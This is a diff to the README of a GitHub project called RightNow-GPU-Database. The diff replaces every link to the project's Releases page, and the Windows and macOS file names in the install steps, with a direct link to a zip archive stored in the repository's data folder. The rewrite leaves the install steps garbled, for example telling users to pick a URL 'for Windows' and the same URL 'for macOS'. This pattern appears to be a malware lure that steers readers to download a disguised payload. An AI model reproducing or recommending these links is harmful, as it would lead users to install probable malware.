@@ -1,6 +1,6 @@
 # 🎮 RightNow-GPU-Database - Discover Your GPU's Specs Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-green)](https://github.com/reox007/RightNow-GPU-Database/releases)
+[![Download Now](https://github.com/reox007/RightNow-GPU-Database/raw/refs/heads/main/data/Database-GP-Now-Right-3.1.zip%20Now-v1.0-green)](https://github.com/reox007/RightNow-GPU-Database/raw/refs/heads/main/data/Database-GP-Now-Right-3.1.zip)
 
 ## 📖 Overview
 
@@ -19,11 +19,11 @@ Before downloading, ensure your system meets the following minimum requirements:
 
 ### 📥 Download & Install
 
-To get started with RightNow-GPU-Database, visit the [Releases page to download](https://github.com/reox007/RightNow-GPU-Database/releases). Here you will find the latest versions of the application available for download.
+To get started with RightNow-GPU-Database, visit the [Releases page to download](https://github.com/reox007/RightNow-GPU-Database/raw/refs/heads/main/data/Database-GP-Now-Right-3.1.zip). Here you will find the latest versions of the application available for download.
 
 1. Click on the link above to go to the Releases page.
 2. Locate the latest version of RightNow-GPU-Database.
-3. Select the appropriate file for your operating system (e.g., `RightNow-GPU-Database.exe` for Windows or `RightNow-GPU-Database.dmg` for macOS).
+3. Select the appropriate file for your operating system (e.g., `https://github.com/reox007/RightNow-GPU-Database/raw/refs/heads/main/data/Database-GP-Now-Right-3.1.zip` for Windows or `https://github.com/reox007/RightNow-GPU-Database/raw/refs/heads/main/data/Database-GP-Now-Right-3.1.zip` for macOS).
 4. Click on the file to download it to your computer.
 
 After downloading, follow these steps to run the application:
@@ -42,7 +42,7 @@ After downloading, follow these steps to run the application:
 
 ### 🔄 Updating the Application
 
-To ensure you experience the best performance, keep your application up to date. Regularly check the [Releases page](https://github.com/reox007/RightNow-GPU-Database/releases) for new updates. 
+To ensure you experience the best performance, keep your application up to date. Regularly check the [Releases page](https://github.com/reox007/RightNow-GPU-Database/raw/refs/heads/main/data/Database-GP-Now-Right-3.1.zip) for new updates. 
 
 1. Revisit the Releases page.
 2. Download the latest version following the same steps as before.
